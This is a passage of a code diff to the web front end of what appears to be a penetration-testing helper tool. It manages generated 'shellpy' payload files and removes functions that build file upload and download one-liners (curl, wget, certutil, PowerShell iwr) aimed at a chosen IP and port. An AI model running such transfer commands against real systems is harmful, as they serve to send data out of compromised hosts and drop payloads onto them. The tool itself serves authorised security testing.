-    `iwr -uri http://${ip}:${port}/ -Method Post -InFile '${file}' -UseBasicParsing`
-  ];
-  const uploadLinux = [
-    `curl -X POST -F 'file=@${file}' http://${ip}:${port}/`,
-    `wget --method=POST --header="Content-Type: multipart/form-data" --body-file=${file} http://${ip}:${port}/`
-  ];
-
-  let outputHTML = `<strong>Upload Commands (Windows):</strong><br>` +
-    uploadWindows.map((cmd, idx) => `
-      <div>
-        <button onclick="copyToClipboard('command-upload-${idx}')">Copiar</button>
-        <code id="command-upload-${idx}">${cmd}</code>
-      </div>`).join('') +
-    `<br><strong>Upload Commands (Linux):</strong><br>` +
-    uploadLinux.map((cmd, idx) => `
-      <div>
-        <button onclick="copyToClipboard('command-upload-${idx + uploadWindows.length}')">Copiar</button>
-        <code id="command-upload-${idx + uploadWindows.length}">${cmd}</code>
-      </div>`).join('');
-
-  document.getElementById('upload-command-output').innerHTML = outputHTML;
+  status.textContent = data.count + ' files generated';
+  status.style.color = 'var(--green)';
+  refreshShellpyFileList();
+  loadShellpyViewer();
 }
-*/
-function generateDownloadCommands() {
-  const file = document.getElementById('download-file-field').value;
-  const port = document.getElementById('download-port-field').value;
-  const ip = document.getElementById('download-ip-select').value;
 
-  if (!file || !port || !ip) {
-    alert('Completa todos los campos');
+async function clearShellpyFiles() {
+  await fetch('/api/shellpy/clear', { method: 'POST' });
+  document.getElementById('sp-status').textContent = 'Cleared';
+  refreshShellpyFileList();
+  var viewer = document.getElementById('sp-file-viewer');
+  while (viewer.firstChild) viewer.removeChild(viewer.firstChild);
+}
+
+async function refreshShellpyFileList() {
+  var res = await fetch('/api/shellpy/files');
+  var files = await res.json();
+  var container = document.getElementById('shellpy-files');
+  if (!container) return;
+  while (container.firstChild) container.removeChild(container.firstChild);
+
+  if (files.length === 0) {
+    var msg = document.createElement('div');
+    msg.style.cssText = 'color:var(--text-muted);font-size:11px;padding:4px 0;';
+    msg.textContent = 'No payloads generated yet';
+    container.appendChild(msg);
     return;
   }
 
-  const downloadWindows = [
-    `curl http://${ip}:${port}/download/${file} -o ${file}`,
-    `certutil.exe -f -urlcache -split http://${ip}:${port}/download/${file}`,
-    `iwr -uri http://${ip}:${port}/download/${file} -OutFile ${file}`,
-    `iwr -UseBasicParsing http://${ip}:${port}/download/${file} -OutFile ${file}`
-  ];
-  const downloadLinux = [
-    `wget http://${ip}:${port}/download/${file}`,
-    `curl -O http://${ip}:${port}/download/${file}`
-  ];
+  files.forEach(function(f) {
+    var item = document.createElement('div');
+    item.className = 'file-item-simple sp-file';
+    item.textContent = f;
+    item.style.cursor = 'pointer';
+    item.setAttribute('data-file', f);
+    item.onclick = function() { viewShellpyFile(this.getAttribute('data-file')); };
+    container.appendChild(item);
+  });
+}
 
-  let outputHTML = `<strong>Download Commands (Windows):</strong><br>` +
-    downloadWindows.map(cmd => `
-      <div>
-        <button onclick="navigator.clipboard.writeText('${cmd}')">Copy</button>
-        <span>${cmd}</span>
-      </div>`).join('') +
-    `<br><br><strong>Download Commands (Linux):</strong><br>` +
-    downloadLinux.map(cmd => `
-      <div>
-        <button onclick="navigator.clipboard.writeText('${cmd}')">Copy</button>
-        <span>${cmd}</span>
-      </div>`).join('');
+async function viewShellpyFile(filename) {
+  var res = await fetch('/api/shellpy/files/' + encodeURIComponent(filename));
+  var data = await res.json();
+  if (data.error) return;
 
-  document.getElementById('download-command-output').innerHTML = outputHTML;
+  // Switch to shellpy tab and show content
+  document.querySelectorAll('.tab-content').forEach(function(el) { el.style.display = 'none'; });
+  document.querySelectorAll('.tabs .tab').forEach(function(el) { el.classList.remove('active'); });
+  document.getElementById('shellpy-area').style.display = 'block';
+  document.getElementById('shellpy-tab').classList.add('active');
+
+  var viewer = document.getElementById('sp-file-viewer');
+  while (viewer.firstChild) viewer.removeChild(viewer.firstChild);
+
+  var card = document.createElement('div');
+  card.className = 'payload-block';
+
+  var header = document.createElement('div');
+  header.className = 'payload-header';
+
+  var name = document.createElement('span');
+  name.textContent = data.filename;
+
+  var btns = document.createElement('div');
+  btns.style.cssText = 'display:flex;gap:4px;';
+
+  var copyBtn = document.createElement('button');
+  copyBtn.className = 'copy-btn';
+  copyBtn.textContent = 'Copy';
+  copyBtn.setAttribute('data-payload', data.content);
+  copyBtn.onclick = function() { navigator.clipboard.writeText(this.getAttribute('data-payload')); this.textContent = 'Copied!'; };
+
+  var dlBtn = document.createElement('button');
+  dlBtn.className = 'copy-btn';
+  dlBtn.textContent = 'Download';
+  dlBtn.onclick = function() { window.location.href = '/download/shellpy/' + encodeURIComponent(data.filename); };
+
+  btns.appendChild(copyBtn);
+  btns.appendChild(dlBtn);
+  header.appendChild(name);
+  header.appendChild(btns);
+
+  var body = document.createElement('div');
+  body.className = 'payload-body';
+  body.style.maxHeight = '400px';
+  body.textContent = data.content;
+
+  card.appendChild(header);
+  card.appendChild(body);
+  viewer.appendChild(card);
+}
+
+async function loadShellpyViewer() {
+  var res = await fetch('/api/shellpy/files');
+  var files = await res.json();
+  var viewer = document.getElementById('sp-file-viewer');
+  while (viewer.firstChild) viewer.removeChild(viewer.firstChild);
+
+  files.forEach(function(f) {
+    var row = document.createElement('div');
+    row.className = 'cmd-row';
+    row.style.cursor = 'pointer';
+
+    var code = document.createElement('code');
+    code.textContent = f;
+    code.style.flex = '1';
+
+    var copyBtn = document.createElement('button');
+    copyBtn.className = 'btn btn-sm';
+    copyBtn.textContent = 'View';
+    copyBtn.setAttribute('data-file', f);
+    copyBtn.onclick = function(e) { e.stopPropagation(); viewShellpyFile(this.getAttribute('data-file')); };
+
+    var dlBtn = document.createElement('button');
+    dlBtn.className = 'btn btn-sm';
+    dlBtn.textContent = 'DL';
+    dlBtn.onclick = function(e) { e.stopPropagation(); window.location.href = '/download/shellpy/' + encodeURIComponent(f); };
+
+    row.appendChild(code);
+    row.appendChild(copyBtn);
+    row.appendChild(dlBtn);
+    viewer.appendChild(row);
+  });
 }
 </script>
-
